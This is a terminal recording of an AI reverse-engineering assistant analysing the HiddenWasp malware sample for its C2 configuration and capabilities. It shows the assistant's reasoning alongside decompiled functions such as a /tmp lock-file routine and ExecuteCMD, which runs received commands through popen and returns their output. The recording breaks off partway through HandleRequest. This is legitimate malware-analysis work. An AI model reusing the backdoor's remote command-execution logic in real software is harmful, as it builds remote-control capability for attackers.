{"version": 2, "width": 283, "height": 66, "timestamp": 1700550117, "env": {"SHELL": "/bin/zsh", "TERM": "xterm-256color"}}
[0.029541, "o", "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                                                                                                                                                                          \r \r"]
[0.03005, "o", "\r\u001b[0m\u001b[27m\u001b[24m\u001b[Jkaida@kaidas-MacBook-Pro reverse-engineering-assistant % \u001b[K\u001b[?2004h"]
[0.807969, "o", "revassistant --verbose --project hiddenwasp"]
[1.928849, "o", "\u001b[?2004l\r\r\n"]
[4.185426, "o", "\u001b[2;36m[11/21/23 16:02:01]\u001b[0m\u001b[2;36m \u001b[0m\u001b[34mINFO    \u001b[0m INFO:reverse_engineering_assistant:Updating embeddings\u001b[33m...\u001b[0m this might take a while\u001b[33m...\u001b[0m                                                                                                                                                          \u001b]8;id=239257;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py\u001b\\\u001b[2massistant.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=228561;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py#506\u001b\\\u001b[2m506\u001b[0m\u001b]8;;\u001b\\\r\n"]
[4.18861, "o", "\u001b[2;36m                   \u001b[0m\u001b[2;36m \u001b[0m\u001b[32mDEBUG   \u001b[0m DEBUG:reverse_engineering_assistant:Building query engine                                                                                                                                                                                     \u001b]8;id=622320;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py\u001b\\\u001b[2massistant.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=778998;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py#430\u001b\\\u001b[2m430\u001b[0m\u001b]8;;\u001b\\\r\n"]
[4.189751, "o", "> "]
[5.464682, "o", "T"]
[5.567729, "o", "h"]
[5.720417, "o", "i"]
[5.784254, "o", "s"]
[5.912162, "o", " "]
[6.12754, "o", "s"]
[6.256267, "o", "o"]
[6.402016, "o", "f"]
[6.592131, "o", "t"]
[6.791995, "o", "w"]
[6.982798, "o", "a"]
[7.168475, "o", "r"]
[7.287759, "o", "e"]
[7.36026, "o", " "]
[7.519504, "o", "i"]
[7.624464, "o", "s"]
[7.712171, "o", " "]
[7.840255, "o", "a"]
[7.94401, "o", " "]
[8.136395, "o", "m"]
[8.264353, "o", "a"]
[8.383989, "o", "l"]
[8.519241, "o", "e"]
[8.960704, "o", "\b \b"]
[9.056055, "o", "w"]
[9.216536, "o", "a"]
[9.408713, "o", "r"]
[9.552112, "o", "e"]
[10.679806, "o", "."]
[11.264476, "o", " "]
[13.248401, "o", "P"]
[13.424231, "o", "l"]
[13.576108, "o", "e"]
[13.758682, "o", "a"]
[13.984333, "o", "s"]
[14.18421, "o", "e"]
[14.376139, "o", " "]
[14.61721, "o", "l"]
[14.819316, "o", "o"]
[14.936155, "o", "o"]
[15.088271, "o", "k"]
[15.192011, "o", " "]
[15.36027, "o", "f"]
[15.466348, "o", "o"]
[15.585632, "o", "r"]
[15.665997, "o", " "]
[15.904594, "o", "t"]
[16.024357, "o", "h"]
[16.095669, "o", "e"]
[16.2081, "o", " "]
[16.96714, "o", "c"]
[17.081358, "o", "o"]
[17.240197, "o", "m"]
[17.369126, "o", "m"]
[17.455775, "o", "a"]
[17.560574, "o", "n"]
[17.649935, "o", "d"]
[17.76028, "o", " "]
[17.896588, "o", "a"]
[17.983599, "o", "n"]
[18.104214, "o", "d"]
[18.240235, "o", " "]
[18.471977, "o", "c"]
[18.573953, "o", "o"]
[18.719606, "o", "n"]
[18.823496, "o", "t"]
[18.968992, "o", "r"]
[19.080178, "o", "o"]
[19.233282, "o", "l"]
[19.344088, "o", " "]
[20.872173, "o", "d"]
[21.169523, "o", "\b \b"]
[21.263623, "o", "c"]
[21.343965, "o", "o"]
[21.504613, "o", "n"]
[21.585742, "o", "f"]
[21.711761, "o", "i"]
[21.833159, "o", "g"]
[21.919285, "o", "u"]
[22.01776, "o", "r"]
[22.312247, "o", "a"]
[22.496035, "o", "t"]
[22.583723, "o", "i"]
[22.71167, "o", "o"]
[22.839703, "o", "n"]
[23.160377, "o", " "]
[23.352628, "o", "a"]
[23.456078, "o", "n"]
[23.527748, "o", "d"]
[23.62513, "o", " "]
[23.760193, "o", "t"]
[23.866373, "o", "h"]
[23.935661, "o", "e"]
[24.04013, "o", " "]
[24.559081, "o", "l"]
[24.741948, "o", "i"]
[24.902833, "o", "s"]
[25.111129, "o", "t"]
[25.224144, "o", " "]
[25.416793, "o", "o"]
[25.495804, "o", "f"]
[25.602195, "o", " "]
[25.695822, "o", "c"]
[25.866667, "o", "a"]
[25.960196, "o", "p"]
[26.047119, "o", "a"]
[26.16907, "o", "b"]
[26.992007, "o", "i"]
[27.208182, "o", "l"]
[27.418319, "o", "i"]
[27.543176, "o", "t"]
[27.720883, "o", "i"]
[27.823001, "o", "e"]
[27.954065, "o", "s"]
[28.633022, "o", "."]
[28.711574, "o", " "]
[29.325379, "o", "P"]
[29.466078, "o", "l"]
[29.528177, "o", "e"]
[29.695715, "o", "a"]
[29.845973, "o", "s"]
[30.00781, "o", "e"]
[30.14275, "o", " "]
[31.208612, "o", "\b \b"]
[31.370694, "o", "\b \b"]
[31.870642, "o", "\b \b"]
[31.953979, "o", "\b \b"]
[32.037247, "o", "\b \b"]
[32.119951, "o", "\b \b"]
[32.22319, "o", "\b \b"]
[32.456136, "o", "E"]
[32.622172, "o", "x"]
[32.775714, "o", "a"]
[32.889018, "o", "m"]
[33.159471, "o", "i"]
[33.312181, "o", "n"]
[33.386874, "o", "e"]
[33.496041, "o", " "]
[33.586888, "o", "t"]
[33.656184, "o", "h"]
[33.750713, "o", "e"]
[33.82047, "o", " "]
[33.927731, "o", "s"]
[34.119816, "o", "o"]
[34.222434, "o", "f"]
[34.440378, "o", "t"]
[34.622708, "o", "w"]
[34.774776, "o", "a"]
[34.94387, "o", "r"]
[35.070785, "o", "e"]
[35.126217, "o", " "]
[35.327897, "o", "i"]
[35.4664, "o", "n"]
[35.633075, "o", " "]
[35.792064, "o", "d"]
[35.953339, "o", "e"]
[36.327601, "o", "t"]
[36.526775, "o", "a"]
[36.618179, "o", "i"]
[36.758736, "o", "l"]
[36.849609, "o", " "]
[36.985756, "o", "a"]
[37.072079, "o", "n"]
[37.159205, "o", "d"]
[37.217739, "o", " "]
[37.344234, "o", "r"]
[37.471648, "o", "e"]
[37.585678, "o", "p"]
[37.726762, "o", "o"]
[37.802271, "o", "r"]
[37.96015, "o", "t"]
[38.063751, "o", " "]
[38.176072, "o", "y"]
[38.255125, "o", "o"]
[38.402453, "o", "u"]
[38.466661, "o", "r"]
[38.605937, "o", " "]
[38.726584, "o", "f"]
[38.83319, "o", "i"]
[38.959946, "o", "n"]
[39.040252, "o", "d"]
[39.150587, "o", "i"]
[39.271276, "o", "n"]
[39.336147, "o", "g"]
[39.488369, "o", "s"]
[39.623957, "o", "."]
[39.92865, "o", "\r\n"]
[44.077575, "o", "\u001b[1;3;38;5;200mThought: To begin the analysis, I need to examine the list of defined functions within the software to identify potential functions related to command and control (C2) configuration and capabilities.\r\nAction: get_defined_function_list_paginated\r\nAction Input: {'page': 1}\r\n\u001b[0m"]
[44.314859, "o", "\u001b[1;3;34mObservation: ['undefined8 __stdcall deflateGetDictionary(long param_1, void * param_2, uint * param_3)', 'undefined __stdcall valueToQuotedStringN(char * param_1, uint param_2)', 'undefined __thiscall addErrorAndRecover(basic_string * param_1, Token * param_2, TokenType param_3)', 'undefined __thiscall operator+=(long param_1)', 'size_t _S_buffer_size(void)', 'undefined __stdcall throwRuntimeError(basic_string * param_1)', 'undefined __thiscall ~Factory(void)', '__uid_t * __stdcall hiding_init(void)', 'undefined __thiscall operator!(void)', 'void __thiscall _M_deallocate_map(Value * * * __p, size_t __n)', 'undefined __thiscall CZString(char * param_1, uint param_2, DuplicationPolicy param_3)', 'undefined8 __stdcall hiding_free(void * param_1)', 'ulong __stdcall crc32_combine_(ulong param_1, ulong param_2, ulong param_3)', 'undefined __thiscall currentValue(void)', 'void __thiscall ~ClientConnection(int __in_chrg)', 'undefined __thiscall PathArgument(char * param_1)', 'undefined __thiscall ValueIterat"]
[44.314889, "o", "orBase(_Rb_tree_iterator * param_1)', 'undefined __thiscall StyledStreamWriter(basic_string param_1)', 'undefined __stdcall readArray(Token * param_1)', 'undefined __thiscall operator<(Value * param_1)']\r\n\u001b[0m"]
[50.791306, "o", "\u001b[1;3;38;5;200mThought: The initial list of functions does not provide clear indicators of command and control configuration or capabilities. I should look for functions with names that suggest network activity, encryption, configuration, or other suspicious behavior typically associated with malware. If no such functions are immediately apparent, I may need to examine more functions or look for strings and other indicators within the decompiled code of these functions.\r\nAction: get_defined_function_list_paginated\r\nAction Input: {'page': 2}\r\n\u001b[0m"]
[50.791548, "o", "\u001b[1;3;34mObservation: ['__normal_iterator<char*,std::vector<char,_std::allocator<char>_>_> * __thiscall operator++(void)', 'undefined __thiscall insert_unique(basic_string * param_1)', 'bool __thiscall Close(void)', 'undefined __stdcall get(uint param_1, Value * param_2)', 'undefined __thiscall OurFeatures(void)', 'uint __stdcall deflate_slow(long * * param_1, int param_2)', 'char * uninitialized_copy<char*,_char*>(char * __first, char * __last, char * __result)', 'undefined __thiscall isInt(void)', 'undefined __thiscall operator==(CZString * param_1)', 'void __thiscall RepairPreload(void)', 'bool runSingleInstance(void)', 'undefined __thiscall ~Writer(void)', '__normal_iterator<char*,std::vector<char,_std::allocator<char>_>_> __stdcall copy_b_n<__gnu_cxx::__normal_iterator<char*,_std::vector<char,_std::allocator<char>_>_>,___gnu_cxx::__normal_iterator<char*,_std::vector<char,_std::allocator<char>_>_>_>(__normal_iterator<char*,std::vector<char,_std::allocator<char>_>_> __first, __normal_iterator<char*,std::ve"]
[50.791893, "o", "ctor<char,_std::allocator<char>_>_> __last, __normal_iterator<char*,std::vector<char,_std::allocator<char>_>_> __result)', 'undefined __thiscall writeValue(Value * param_1)', 'undefined __thiscall Reader(Features * param_1)', 'undefined __stdcall isMember(char * param_1, char * param_2)', 'void __thiscall ~allocator(int __in_chrg)', 'void __thiscall ~_Deque_impl(int __in_chrg)', 'void __thiscall _M_fill_insert(__normal_iterator<char*,std::vector<char,_std::allocator<char>_>_> __position, size_t __n, char * __x)', 'undefined __thiscall _M_copy(_Rb_tree_node * param_1, _Rb_tree_node * param_2)']\r\n\u001b[0m"]
[56.709786, "o", "\u001b[1;3;38;5;200mThought: The functions listed on the second page also do not provide clear indicators of command and control capabilities. However, the function `runSingleInstance` could potentially be related to ensuring only one instance of the malware runs at a time, which is a common behavior in malware to avoid detection and resource conflicts. I should decompile this function to examine its behavior more closely.\r\nAction: get_decompilation_for_function\r\nAction Input: {'function_name_or_address': 'runSingleInstance'}\r\n\u001b[0m"]
[56.713838, "o", "\u001b[2;36m[11/21/23 16:02:53]\u001b[0m\u001b[2;36m \u001b[0m\u001b[32mDEBUG   \u001b[0m DEBUG:reverse_engineering_assistant:Serialising document runSingleInstance                                                                                                                                                                     \u001b]8;id=58912;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/documents.py\u001b\\\u001b[2mdocuments.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=560777;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/documents.py#55\u001b\\\u001b[2m55\u001b[0m\u001b]8;;\u001b\\\r\n"]
[56.714176, "o", "\u001b[1;3;34mObservation: {\"name\": \"runSingleInstance\", \"content\": \"\\\"\\\\\\\"\\\\\\\\n/* WARNING: Unknown calling convention */\\\\\\\\n\\\\\\\\nbool runSingleInstance(void)\\\\\\\\n\\\\\\\\n{\\\\\\\\n  char cVar1;\\\\\\\\n  int iVar2;\\\\\\\\n  uint uVar3;\\\\\\\\n  char *pcVar4;\\\\\\\\n  ssize_t sVar5;\\\\\\\\n  ulong uVar6;\\\\\\\\n  bool local_94;\\\\\\\\n  flock fl;\\\\\\\\n  char pids [10];\\\\\\\\n  string filePath;\\\\\\\\n  string processName;\\\\\\\\n  basic_string<char,std::char_traits<char>,std::allocator<char>_> local_38 [2];\\\\\\\\n  basic_string<char,std::char_traits<char>,std::allocator<char>_> local_28;\\\\\\\\n  allocator<char> local_1d;\\\\\\\\n  int lock_file;\\\\\\\\n  \\\\\\\\n  currentExeName();\\\\\\\\n                    /* try { // try from 0041341d to 00413421 has its CatchHandler @ 00413666 */\\\\\\\\n  cVar1 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::empty();\\\\\\\\n  if (cVar1 == '\\\\\\\\\\\\\\\\0') {\\\\\\\\n    std::allocator<char>::allocator();\\\\\\\\n                    /* try { // try from 0041344b to 0041344f has its CatchHandler @ 004134e4 */\\\\\\\\n    std::basic"]
[56.714333, "o", "_string<char,std::char_traits<char>,std::allocator<char>>::basic_string\\\\\\\\n              ((char *)&local_28,(allocator *)\\\\\\\\\\\\\\\"/tmp/\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041345c to 00413460 has its CatchHandler @ 004134a9 */\\\\\\\\n    std::operator+<char,_std::char_traits<char>,_std::allocator<char>_>(local_38,&local_28);\\\\\\\\n                    /* try { // try from 0041346e to 00413472 has its CatchHandler @ 0041347e */\\\\\\\\n    std::operator+<char,_std::char_traits<char>,_std::allocator<char>_>(&filePath,(char *)local_38);\\\\\\\\n                    /* try { // try from 00413477 to 0041347b has its CatchHandler @ 004134a9 */\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_38);\\\\\\\\n                    /* try { // try from 004134a2 to 004134a6 has its CatchHandler @ 004134e4 */\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_s"]
[56.714466, "o", "tring\\\\\\\\n              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_28);\\\\\\\\n    std::allocator<char>::~allocator(&local_1d);\\\\\\\\n                    /* try { // try from 004134d6 to 00413622 has its CatchHandler @ 0041363b */\\\\\\\\n    pcVar4 = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str\\\\\\\\n                               ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)\\\\\\\\n                                &filePath);\\\\\\\\n    lock_file = open(pcVar4,0x242,0x1a4);\\\\\\\\n    if (lock_file == -1) {\\\\\\\\n      local_94 = false;\\\\\\\\n    }\\\\\\\\n    else {\\\\\\\\n      fl.l_type = 1;\\\\\\\\n      fl.l_whence = 0;\\\\\\\\n      fl.l_start = 0;\\\\\\\\n      fl.l_len = 0;\\\\\\\\n      iVar2 = fcntl(lock_file,6,&fl);\\\\\\\\n      if (iVar2 == -1) {\\\\\\\\n        close(lock_file);\\\\\\\\n        local_94 = false;\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        uVar3 = getpid();\\\\\\\\n        snprintf(pids,10,\\\\\\\\\\\\\\\"%d\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\",(ulong)uVar3);\\\\\\\\n        uVar6 = 0x"]
[56.714678, "o", "ffffffffffffffff;\\\\\\\\n        pcVar4 = pids;\\\\\\\\n        do {\\\\\\\\n          if (uVar6 == 0) break;\\\\\\\\n          uVar6 = uVar6 - 1;\\\\\\\\n          cVar1 = *pcVar4;\\\\\\\\n          pcVar4 = pcVar4 + 1;\\\\\\\\n        } while (cVar1 != '\\\\\\\\\\\\\\\\0');\\\\\\\\n        sVar5 = write(lock_file,pids,~uVar6 - 1);\\\\\\\\n        uVar6 = 0xffffffffffffffff;\\\\\\\\n        pcVar4 = pids;\\\\\\\\n        do {\\\\\\\\n          if (uVar6 == 0) break;\\\\\\\\n          uVar6 = uVar6 - 1;\\\\\\\\n          cVar1 = *pcVar4;\\\\\\\\n          pcVar4 = pcVar4 + 1;\\\\\\\\n        } while (cVar1 != '\\\\\\\\\\\\\\\\0');\\\\\\\\n        if (sVar5 == ~uVar6 - 1) {\\\\\\\\n          local_94 = true;\\\\\\\\n        }\\\\\\\\n        else {\\\\\\\\n          close(lock_file);\\\\\\\\n          local_94 = false;\\\\\\\\n        }\\\\\\\\n      }\\\\\\\\n    }\\\\\\\\n                    /* try { // try from 0041365f to 00413663 has its CatchHandler @ 00413666 */\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n              ((basic_string<char,std::char_traits<char>,std::all"]
[56.714811, "o", "ocator<char>> *)&filePath);\\\\\\\\n  }\\\\\\\\n  else {\\\\\\\\n    local_94 = false;\\\\\\\\n  }\\\\\\\\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&processName);\\\\\\\\n  return local_94;\\\\\\\\n}\\\\\\\\n\\\\\\\\n\\\\\\\"\\\"\", \"metadata\": {\"function_name\": \"runSingleInstance\", \"function_start_address\": \"00413404\", \"function_end_address\": \"004136a8\", \"function_signature\": \"bool runSingleInstance(void)\", \"inbound_calls\": [\"main\"], \"outbound_calls\": [\"operator+<char,_std::char_traits<char>,_std::allocator<char>_>\", \"allocator\", \"fcntl\", \"snprintf\", \"operator+<char,_std::char_traits<char>,_std::allocator<char>_>\", \"empty\", \"write\", \"~allocator\", \"currentExeName\", \"~basic_string\", \"getpid\", \"open\", \"close\", \"basic_string\", \"c_str\"], \"is_external\": false, \"document_type\": \"decompiled_function\"}}\r\n\u001b[0m"]
[67.156707, "o", "\u001b[1;3;38;5;200mThought: The decompiled content of the `runSingleInstance` function suggests that it is designed to ensure that only one instance of the process runs at a time. It does this by creating a lock file in the `/tmp/` directory and writing the process ID to it. If the file is already locked, it means another instance is running, and this instance will not proceed. This is a common technique used by both legitimate software and malware to prevent multiple instances from running simultaneously.\r\n\r\nTo find the command and control configuration and the list of capabilities, I should look for other functions or strings that might indicate network communication, file manipulation, or other suspicious activities. Since the current list of functions does not reveal much about C2 capabilities, I should look for strings that might be hardcoded in the binary, such as URLs, IP addresses, or particular keywords related to C2.\r\nAction: get_defined_function_list_paginated\r\nAction Input: {'page': 3}\r\n\u001b[0m"]
[67.156887, "o", "\u001b[1;3;34mObservation: ['undefined __thiscall readToken(Token * param_1)', 'undefined __stdcall pushValue(basic_string * param_1)', 'undefined __thiscall toStyledString(void)', 'undefined __thiscall asUInt(void)', 'void __thiscall _M_deallocate_node(Value * * __p)', 'void __thiscall __normal_iterator(char * * __i)', 'undefined __thiscall operator[](char * param_1)', 'int __thiscall Write(char * data, int length)', 'undefined __stdcall _tr_align(long param_1)', 'int __stdcall patch_ld(void)', 'int __thiscall ExecuteCMD(char * data, Param * param_)', 'void __thiscall Command(void)', 'undefined __thiscall Value(double param_1)', 'undefined __thiscall ~Value(void)', 'void _Destroy<std::_Deque_iterator<Json::Reader::ErrorInfo,_Json::Reader::ErrorInfo&,_Json::Reader::ErrorInfo*>_>(_Deque_iterator<Json::Reader::ErrorInfo,Json::Reader::ErrorInfo&,Json::Reader::ErrorInfo*> __first, _Deque_iterator<Json::Reader::ErrorInfo,Json::Reader::ErrorInfo&,Json::Reader::ErrorInfo*> __last)', 'allocator<char> * __thiscall _M_get_T"]
[67.157168, "o", "p_allocator(void)', 'undefined __thiscall readToken(Token * param_1)', 'undefined __thiscall ~FastWriter(void)', 'bool __thiscall HandleRequest(Value * request)', 'undefined __thiscall hasCommentForValue(Value * param_1)']\r\n\u001b[0m"]
[78.943545, "o", "\u001b[1;3;38;5;200mThought: Among the functions listed on the third page, a few stand out as potentially related to malware capabilities:\r\n\r\n- `Write(char * data, int length)`: This function could be involved in writing data, possibly to a file or a network socket.\r\n- `patch_ld(void)`: The name suggests it might be used to patch or modify something, potentially in a malicious way.\r\n- `ExecuteCMD(char * data, Param * param_)`: This function name implies the execution of commands, which could be a part of the malware's capabilities to execute arbitrary commands on the infected system.\r\n- `Command(void)`: This is another function that could be related to command execution or handling.\r\n- `HandleRequest(Value * request)`: This function could be involved in handling network requests, which might be related to command and control communication.\r\n\r\nTo further investigate these functions, I should decompile them to understand their behavior and determine if they are related to the malware's command and control configurat"]
[78.943758, "o", "ion or capabilities.\r\nAction: get_decompilation_for_function\r\nAction Input: {'function_name_or_address': 'ExecuteCMD'}\r\n\u001b[0m"]
[78.945955, "o", "\u001b[2;36m[11/21/23 16:03:16]\u001b[0m\u001b[2;36m \u001b[0m\u001b[32mDEBUG   \u001b[0m DEBUG:reverse_engineering_assistant:Serialising document ExecuteCMD                                                                                                                                                                            \u001b]8;id=413059;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/documents.py\u001b\\\u001b[2mdocuments.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=569298;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/documents.py#55\u001b\\\u001b[2m55\u001b[0m\u001b]8;;\u001b\\\r\n"]
[78.946324, "o", "\u001b[1;3;34mObservation: {\"name\": \"ExecuteCMD\", \"content\": \"\\\"\\\\\\\"\\\\\\\\n/* DWARF original prototype: int  ExecuteCMD(Command * this, char * data, Param * param_) */\\\\\\\\n\\\\\\\\nint __thiscall Command::ExecuteCMD(Command *this,char *data,Param *param_)\\\\\\\\n\\\\\\\\n{\\\\\\\\n  char cVar1;\\\\\\\\n  bool bVar2;\\\\\\\\n  FILE *__stream;\\\\\\\\n  char *pcVar3;\\\\\\\\n  ulong uVar4;\\\\\\\\n  int local_1054;\\\\\\\\n  Param *param__local;\\\\\\\\n  char *data_local;\\\\\\\\n  Command *this_local;\\\\\\\\n  char resbuf [4096];\\\\\\\\n  string res;\\\\\\\\n  FILE *cmdRes;\\\\\\\\n  size_t length;\\\\\\\\n  \\\\\\\\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();\\\\\\\\n                    /* try { // try from 004175c6 to 004176b6 has its CatchHandler @ 004176cb */\\\\\\\\n  __stream = popen(data,\\\\\\\\\\\\\\\"r\\\\\\\\\\\\\\\");\\\\\\\\n  if (__stream == (FILE *)0x0) {\\\\\\\\n    pclose((FILE *)0x0);\\\\\\\\n    local_1054 = 0;\\\\\\\\n  }\\\\\\\\n  else {\\\\\\\\n    do {\\\\\\\\n      pcVar3 = fgets(resbuf,0x1000,__stream);\\\\\\\\n      if (pcVar3 == (char *)0x0) {\\\\\\\\n        Param::WriteBo"]
[78.946451, "o", "dy(param_,&DAT_0044d171,0);\\\\\\\\n        pclose(__stream);\\\\\\\\n        local_1054 = 1;\\\\\\\\n        goto LAB_004176f5;\\\\\\\\n      }\\\\\\\\n      uVar4 = 0xffffffffffffffff;\\\\\\\\n      pcVar3 = resbuf;\\\\\\\\n      do {\\\\\\\\n        if (uVar4 == 0) break;\\\\\\\\n        uVar4 = uVar4 - 1;\\\\\\\\n        cVar1 = *pcVar3;\\\\\\\\n        pcVar3 = pcVar3 + 1;\\\\\\\\n      } while (cVar1 != '\\\\\\\\\\\\\\\\0');\\\\\\\\n    } while ((~uVar4 - 1 == 0) ||\\\\\\\\n            (bVar2 = Param::WriteBody(param_,resbuf,(uint16_t)(~uVar4 - 1)), bVar2));\\\\\\\\n    pclose(__stream);\\\\\\\\n    local_1054 = -1;\\\\\\\\n  }\\\\\\\\nLAB_004176f5:\\\\\\\\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&res);\\\\\\\\n  return local_1054;\\\\\\\\n}\\\\\\\\n\\\\\\\\n\\\\\\\"\\\"\", \"metadata\": {\"function_name\": \"ExecuteCMD\", \"function_start_address\": \"00417590\", \"function_end_address\": \"0041770d\", \"function_signature\": \"int __thiscall ExecuteCMD(char * data, Param * param_)\", \"inbound_calls"]
[78.94655, "o", "\": [\"HandleRequest\"], \"outbound_calls\": [\"fgets\", \"~basic_string\", \"popen\", \"basic_string\", \"pclose\", \"WriteBody\"], \"is_external\": false, \"document_type\": \"decompiled_function\"}}\r\n\u001b[0m"]
[95.812362, "o", "\u001b[1;3;38;5;200mThought: The decompiled content of the `ExecuteCMD` function confirms that it is designed to execute system commands. It uses `popen` to execute a command from the `data` parameter and reads the output with `fgets`. The output is then written somewhere using `Param::WriteBody`, which could be a network socket or a file, indicating that the function may be used to send command execution results back to a command and control server or to store them locally.\r\n\r\nThe presence of this function is a strong indicator of the malware's capabilities, as it allows the execution of arbitrary commands, which is a common feature in many types of malware. This could be part of the malware's command execution capability for remote control.\r\n\r\nGiven this information, I should now look for functions or references that suggest how the malware receives commands or configuration from a command and control server, which could be indicated by network communication functions or configuration file handling.\r\nAction: get"]
[95.812665, "o", "_references_to_address\r\nAction Input: {'address': '00417590'}\r\n\u001b[0m"]
[95.817348, "o", "\u001b[2;36m[11/21/23 16:03:33]\u001b[0m\u001b[2;36m \u001b[0m\u001b[32mDEBUG   \u001b[0m DEBUG:reverse_engineering_assistant:Searching for \u001b[1;36m00417590\u001b[0m                                                                                                                                                                                    \u001b]8;id=587805;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py\u001b\\\u001b[2massistant.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=647433;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py#315\u001b\\\u001b[2m315\u001b[0m\u001b]8;;\u001b\\\r\n"]
[95.914933, "o", "\u001b[2;36m                   \u001b[0m\u001b[2;36m \u001b[0m\u001b[32mDEBUG   \u001b[0m DEBUG:reverse_engineering_assistant:Found document: \u001b[1m<\u001b[0m\u001b[1;95mreverse_engineering_assistant.documents.CrossReferenceDocument\u001b[0m\u001b[39m object at \u001b[0m\u001b[1;36m0x1670bf0d0\u001b[0m\u001b[1m>\u001b[0m                                                                                                    \u001b]8;id=559267;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py\u001b\\\u001b[2massistant.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=573212;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/assistant.py#318\u001b\\\u001b[2m318\u001b[0m\u001b]8;;\u001b\\\r\n"]
[95.915189, "o", "\u001b[1;3;34mObservation: ['From: Entry Point To: 00417590 Type: EXTERNAL Op: -1 DEFAULT', 'From: 004557e8 To: 00417590 Type: DATA Op: 0 ANALYSIS', 'From: 0045ac8d To: 00417590 Type: DATA Op: 0 ANALYSIS', 'From: 0045ac98 To: 00417590 Type: DATA Op: 0 ANALYSIS', 'From: 0041afaf To: 00417590 Type: UNCONDITIONAL_CALL Op: 0 DEFAULT', 'From: .debug_frame::000015b8 To: 00417590 Type: DATA Op: 0 ANALYSIS', 'From: 00453084 To: 00417590 Type: INDIRECTION Op: 0 ANALYSIS']\r\n\u001b[0m"]
[106.052715, "o", "\u001b[1;3;38;5;200mThought: The references to the `ExecuteCMD` function indicate that it is called from various points within the binary. Notably, there is an \"UNCONDITIONAL_CALL\" from the address `0041afaf`, which suggests that this location in the code directly invokes the `ExecuteCMD` function. This could be a part of the malware's logic where it processes and executes commands received from a command and control server.\r\n\r\nTo further understand how the malware receives its commands or configuration, I should investigate the function that contains the address `0041afaf` to see how it interacts with `ExecuteCMD` and what kind of data it might be passing to it.\r\nAction: get_decompilation_for_function\r\nAction Input: {'function_name_or_address': '0041afaf'}\r\n\u001b[0m"]
[106.05619, "o", "\u001b[2;36m[11/21/23 16:03:43]\u001b[0m\u001b[2;36m \u001b[0m\u001b[32mDEBUG   \u001b[0m DEBUG:reverse_engineering_assistant:Serialising document HandleRequest                                                                                                                                                                         \u001b]8;id=284215;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/documents.py\u001b\\\u001b[2mdocuments.py\u001b[0m\u001b]8;;\u001b\\\u001b[2m:\u001b[0m\u001b]8;id=882521;file:///opt/homebrew/lib/python3.11/site-packages/reverse_engineering_assistant/documents.py#55\u001b\\\u001b[2m55\u001b[0m\u001b]8;;\u001b\\\r\n"]
[106.057448, "o", "\u001b[1;3;34mObservation: {\"name\": \"HandleRequest\", \"content\": \"\\\"\\\\\\\"\\\\\\\\n/* DWARF original prototype: bool  HandleRequest(Worker * this, Value * request) */\\\\\\\\n\\\\\\\\nbool __thiscall Worker::HandleRequest(Worker *this,Value *request)\\\\\\\\n\\\\\\\\n{\\\\\\\\n  ulong uVar1;\\\\\\\\n  long lVar2;\\\\\\\\n  Value json_;\\\\\\\\n  Value uploadjson;\\\\\\\\n  Value cp_mv_json;\\\\\\\\n  ushort uVar3;\\\\\\\\n  bool bVar4;\\\\\\\\n  char cVar5;\\\\\\\\n  uint16_t uVar6;\\\\\\\\n  int iVar7;\\\\\\\\n  uint32_t uVar8;\\\\\\\\n  int iVar9;\\\\\\\\n  Value *pVVar10;\\\\\\\\n  Worker *this_00;\\\\\\\\n  void *pvVar11;\\\\\\\\n  char *pcVar12;\\\\\\\\n  anon_union *__readfds;\\\\\\\\n  undefined in_stack_fffffffffffef4e8 [16];\\\\\\\\n  CommentInfo *in_stack_fffffffffffef4f8;\\\\\\\\n  undefined uStack_10af4;\\\\\\\\n  int iStack_10a78;\\\\\\\\n  Value *request_local;\\\\\\\\n  Worker *this_local;\\\\\\\\n  char buffer [65535];\\\\\\\\n  anon_struct_conflict4 exceptfds;\\\\\\\\n  anon_union attr;\\\\\\\\n  timeval tv;\\\\\\\\n  ClientConnection server;\\\\\\\\n  ClientConnection client;\\\\\\\\n  string des_host;\\\\\\\\n  Value reply_8;\\\\\\\\n  Value r"]
